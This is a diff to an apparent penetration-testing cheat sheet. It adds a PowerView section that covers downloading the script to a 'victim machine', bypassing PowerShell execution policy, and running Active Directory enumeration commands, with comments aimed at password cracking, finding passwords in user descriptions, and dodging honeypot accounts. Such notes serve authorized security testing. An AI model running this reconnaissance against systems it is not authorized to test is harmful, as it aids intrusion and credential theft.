@@ -481,11 +481,47 @@ Ace:{
 
 ```
 
-## DNS take over:
-
-
 ## Domain Enumeration: 
 ### Powerview: 
+Download on to Windows Victim Machine:
+1. https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+From CMD:
+```
+powershell -ep bypass                 # -ep   ExecutionPolicy
+. .\PowerView.ps1
+```
+this will not show any output, you just have to have faith it is running. or try the follwoing commands.
+```
+Get-NetDomain
+Get-NetDomainController
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"        # showws the password policy for easier password cracking
+Get-NetUser                               # can pull lots of info depending on size of domain
+Get-NetUser | select cn                   # will only pull usernames
+Get-NetUser | select samaccountname       # will only pull usernames
+Get-NetUser | select description          # will get descriptions that may have Passwords in them
+Get-UserProperty -Properties pwdlastset   # tells when each usesr password was last reset (good if you have pwnd account info)
+Get-UserProperty -Properties logoncount   # 0 logons is suspicious and maybe the signs of a honeypot account
+Get-UserProperty -Properties badpwdcount  # can show signs of an account that is being brute forced
+Get-NetComputer                           # will list all the computers on the domain
+Get-NetComputer -FullData                 # when you want a Tsunami of information 
+Get-NetComputer -FullData | select <catagory>     # Example Usage Below
+Get-NetComputer -FullData | select OperatinSystem # shows all the Operating Systems on the Domain
+Get-NetGroup
+Get-NetGroup -GroupName "Domain Admins"   # will list domain admins
+Get-NetGroup -GroupName *admin*           # will ist all administrators on the domain
+Get-NetGroupMember -GroupName "Domain Admins"
+Invoke-ShareFinder                        # shows all files and folders being shared on the network
+Get-NetGPO                                # shows all the Group Policies like disabled SMB signing or disabled defender
+Get-NetGPO | select displayname, whenchanged
+```
+References:
+1. https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c379ed3117993/raw/e5e30c942adb2347917563ef0dafa7054882535a/PowerView-3.0-tricks.ps1
+
+
+
+
+
 ### Bloodhound: 
 1. https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
 2. https://github.com/BloodHoundAD/BloodHound
